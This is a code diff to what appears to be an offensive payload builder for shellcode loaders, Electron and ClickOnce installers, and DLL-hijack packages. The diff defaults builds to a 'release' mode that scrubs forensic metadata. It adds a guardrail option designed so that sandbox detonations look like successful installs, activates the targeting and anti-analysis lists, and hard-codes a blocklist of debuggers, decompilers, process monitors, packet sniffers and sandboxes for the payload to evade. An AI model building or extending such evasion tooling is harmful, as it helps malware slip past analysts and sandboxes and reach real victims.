@@ -224,9 +224,9 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
         BuildParameter(
             name = "0.3 Loader Build Configuration",
             parameter_type = BuildParameterType.ChooseOne,
-            description = "Select the loader's build config.",
-            choices = ["debug", "release", "test"],
-            default_value = "debug",
+            description = "Select the loader's build config. Release is the shippable mode: symbols stripped, rich header scrubbed, PE timestamp zeroed, debug directory blob wiped. Debug keeps symbols and leaves forensic metadata intact - use only for local testing.",
+            choices = ["release", "debug", "test"],
+            default_value = "release",
             hide_conditions = [
                 HideCondition(name="0.1 Loader Type", operand=HideConditionOperand.NotEQ, value="Shellcode Loader"),
             ]
@@ -1344,6 +1344,23 @@ generated if none have been entered.""",
                 HideCondition(name="3.E9 Enable Electron Guardrails", operand=HideConditionOperand.EQ, value=False),
             ]
         ),
+        BuildParameter(
+            name = "3.E9q Guardrail Debug Mode",
+            parameter_type = BuildParameterType.Boolean,
+            description = (
+                "TESTING ONLY. When True, guardrail failures are surfaced visibly: "
+                "failure reasons are logged to the Electron console AND displayed "
+                "as a red banner inside the wizard instead of silently advancing to "
+                "Finish. Also logs which check blocked the install. NEVER SHIP WITH "
+                "THIS ENABLED - it defeats the silent-failure property that makes "
+                "sandbox detonations look like successful installs."
+            ),
+            default_value = False,
+            hide_conditions = [
+                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.NotEQ, value="Electron"),
+                HideCondition(name="3.E9 Enable Electron Guardrails", operand=HideConditionOperand.EQ, value=False),
+            ]
+        ),
 
         BuildParameter(
             name="3.1 Compression Level",
@@ -1870,6 +1887,7 @@ generated if none have been entered.""",
                     "minMemoryMb": _int_or("3.E9n Min Memory (MB)", 0),
                     "maxIdleSeconds": _int_or("3.E9o Max Idle Seconds", 0),
                     "preSpawnDelayMs": _int_or("3.E9p Pre-Spawn Delay (ms)", 0),
+                    "debugMode": bool(self.get_parameter("3.E9q Guardrail Debug Mode")),
                 }
 
                 return build_electron_installer(
@@ -2357,6 +2375,25 @@ generated if none have been entered.""",
                         guardrails_check_timing = 1 if self.get_parameter("0.5f Check Timing Anomalies") else 0
                         guardrails_check_sandbox = 1 if self.get_parameter("0.5f1 Check Sandbox Environment") else 0
 
+                        # Parse the list-based guardrail parameters and
+                        # thread them into config.hpp. These render as
+                        # static const char* arrays inside the generated
+                        # GetGuardrailConfig() function; RunGuardrails()
+                        # then sees populated list pointers and the
+                        # CheckHostname / CheckUsername / CheckDomain /
+                        # CheckIPAddress paths actually fire. Prior to
+                        # this, the lists were rendered to a dead
+                        # guardrail.hpp file that main.cpp never included
+                        # and every list-based guardrail was a no-op.
+                        gr_lists = {
+                            "GUARDRAIL_ALLOWED_HOSTNAMES": parse_csv(self.get_parameter("0.5g Hostname Whitelist")) if guardrails_enabled else [],
+                            "GUARDRAIL_BLOCKED_HOSTNAMES": parse_csv(self.get_parameter("0.5h Block Analysis Hostnames")) if guardrails_enabled else [],
+                            "GUARDRAIL_BLOCKED_USERNAMES": parse_csv(self.get_parameter("0.5i Block Analysis Usernames")) if guardrails_enabled else [],
+                            "GUARDRAIL_ALLOWED_IPS":       parse_csv(self.get_parameter("0.5j IP Whitelist")) if guardrails_enabled else [],
+                            "GUARDRAIL_BLOCKED_IPS":       parse_csv(self.get_parameter("0.5k IP Blacklist")) if guardrails_enabled else [],
+                            "GUARDRAIL_ALLOWED_DOMAINS":   parse_csv(self.get_parameter("0.5l Domain Whitelist")) if guardrails_enabled else [],
+                        }
+
                         config_data = {
                             "TARGET_PROCESS": target_process,
                             "INJECTION_TYPE": self.get_parameter("0.4 Shellcode Loader - Injection Type"),
@@ -2373,6 +2410,7 @@ generated if none have been entered.""",
                             "GUARDRAILS_CHECK_TIMING": guardrails_check_timing,
                             "GUARDRAILS_CHECK_SANDBOX": guardrails_check_sandbox,
                             "GUARDRAILS_DECOY_FILE": "decoy.pdf" if self.get_parameter("0.13 Decoy File Inclusion") else "",
+                            **gr_lists,
                         }
                         rendered_config = config_template.render(**config_data)
 
@@ -2461,12 +2499,35 @@ generated if none have been entered.""",
                                 return ""
                             return ", ".join(f'"{item}"' for item in lst)
 
+                        # Default debugger / analysis process blocklist
+                        # rendered into BlockedProcesses. Covers native
+                        # debuggers, .NET decompilers, process monitors,
+                        # and traffic inspectors.
+                        DEFAULT_BLOCKED_PROCESSES = [
+                            # Native debuggers
+                            "x64dbg", "x32dbg", "windbg", "ollydbg", "ida", "ida64",
+                            "immunitydebugger", "radare2",
+                            # .NET decompilers / analysis
+                            "dnspy", "dnspyex", "dotpeek", "ilspy",
+                            "jetbrains.rider", "reflector", "de4dot", "ildasm",
+                            # Process monitors / system inspectors
+                            "processhacker", "procmon", "procmon64", "procexp",
+                            "procexp64", "autoruns", "autorunsc",
+                            # Traffic inspection
+                            "wireshark", "dumpcap", "tcpdump", "fiddler",
+                            "fiddler everywhere", "charles", "burpsuite",
+                            # Sandboxing / analysis harnesses
+                            "sbiectrl", "sandboxiedcomlaunch", "cuckoo",
+                        ]
+
                         # Guardrails configuration for ClickOnce
                         guardrails_enabled = 1 if self.get_parameter("0.5a Enable Guardrails") else 0
                         guardrails_check_debugger = 1 if self.get_parameter("0.5b Check IsDebuggerPresent") else 0
+                        guardrails_check_remote = 1 if self.get_parameter("0.5c Check Remote Debugger") else 0
                         guardrails_check_processes = 1 if self.get_parameter("0.5d Check Debugger Processes") else 0
                         guardrails_check_hwbp = 1 if self.get_parameter("0.5e Check Hardware Breakpoints") else 0
                         guardrails_check_timing = 1 if self.get_parameter("0.5f Check Timing Anomalies") else 0
+                        guardrails_check_sandbox = 1 if self.get_parameter("0.5f1 Check Sandbox Environment") else 0
 
                         injection_config_data = {
                             "COMPRESSION_TYPE": compression_type_value,
@@ -2477,10 +2538,14 @@ generated if none have been entered.""",
                             "ENCRYPTION_KEY": encryption_key_bytes_clickonce,
                             "ENCRYPTION_SHELLCODE": encrypted_shellcode_bytes_clickonce,
                             "GUARDRAILS_ENABLED": "true" if guardrails_enabled else "false",
+                            "DEBUG_LOGGING_ENABLED": "false",  # never ship debug logging; operator can manually flip in InjectionConfig.cs for testing
                             "GUARDRAILS_CHECK_DEBUGGER": "true" if guardrails_check_debugger else "false",
+                            "GUARDRAILS_CHECK_REMOTE_DEBUGGER": "true" if guardrails_check_remote else "false",
                             "GUARDRAILS_CHECK_DEBUGGER_PROCESSES": "true" if guardrails_check_processes else "false",
                             "GUARDRAILS_CHECK_HARDWARE_BREAKPOINTS": "true" if guardrails_check_hwbp else "false",
                             "GUARDRAILS_CHECK_TIMING": "true" if guardrails_check_timing else "false",
+                            "GUARDRAILS_CHECK_SANDBOX": "true" if guardrails_check_sandbox else "false",
+                            "BLOCKED_PROCESSES": array_to_csharp_string(DEFAULT_BLOCKED_PROCESSES),
                             "ALLOWED_HOSTNAMES": array_to_csharp_string(parse_csv(self.get_parameter("0.5g Hostname Whitelist")) if self.get_parameter("0.5a Enable Guardrails") else []),
                             "BLOCKED_HOSTNAMES": array_to_csharp_string(parse_csv(self.get_parameter("0.5h Block Analysis Hostnames")) if self.get_parameter("0.5a Enable Guardrails") else []),
                             "BLOCKED_USERNAMES": array_to_csharp_string(parse_csv(self.get_parameter("0.5i Block Analysis Usernames")) if self.get_parameter("0.5a Enable Guardrails") else []),
@@ -2549,6 +2614,14 @@ generated if none have been entered.""",
                     config_template = environment.get_template("config.hpp")
                     compression_type_value = COMPRESSION_TYPE_MAP.get(self.get_parameter("2.0 Compression Type"), 0)
                     encoding_type_value = ENCODING_TYPE_MAP.get(self.get_parameter("2.3 Encoding Type"), 0)
+                    gr_lists_hijack = {
+                        "GUARDRAIL_ALLOWED_HOSTNAMES": parse_csv(self.get_parameter("1.1f Hostname Whitelist")) if guardrails_enabled else [],
+                        "GUARDRAIL_BLOCKED_HOSTNAMES": parse_csv(self.get_parameter("1.1g Block Analysis Hostnames")) if guardrails_enabled else [],
+                        "GUARDRAIL_BLOCKED_USERNAMES": parse_csv(self.get_parameter("1.1h Block Analysis Usernames")) if guardrails_enabled else [],
+                        "GUARDRAIL_ALLOWED_IPS":       parse_csv(self.get_parameter("1.1i IP Whitelist")) if guardrails_enabled else [],
+                        "GUARDRAIL_BLOCKED_IPS":       parse_csv(self.get_parameter("1.1j IP Blacklist")) if guardrails_enabled else [],
+                        "GUARDRAIL_ALLOWED_DOMAINS":   parse_csv(self.get_parameter("1.1k Domain Whitelist")) if guardrails_enabled else [],
+                    }
                     config_data = {
                         "TARGET_PROCESS": "",
                         "INJECTION_TYPE": 2,  # CreateFiber (self-injection) - DLL runs in the hijacked process
@@ -2565,6 +2638,7 @@ generated if none have been entered.""",
                         "GUARDRAILS_CHECK_TIMING": 1 if self.get_parameter("1.1e Check Timing Anomalies") and guardrails_enabled else 0,
                         "GUARDRAILS_CHECK_SANDBOX": 0,
                         "GUARDRAILS_DECOY_FILE": "",
+                        **gr_lists_hijack,
                     }
                     rendered_config = config_template.render(**config_data)
                     config_hpp_destination = str(PurePath(shellcode_loader_path) / "include" / "config.hpp")
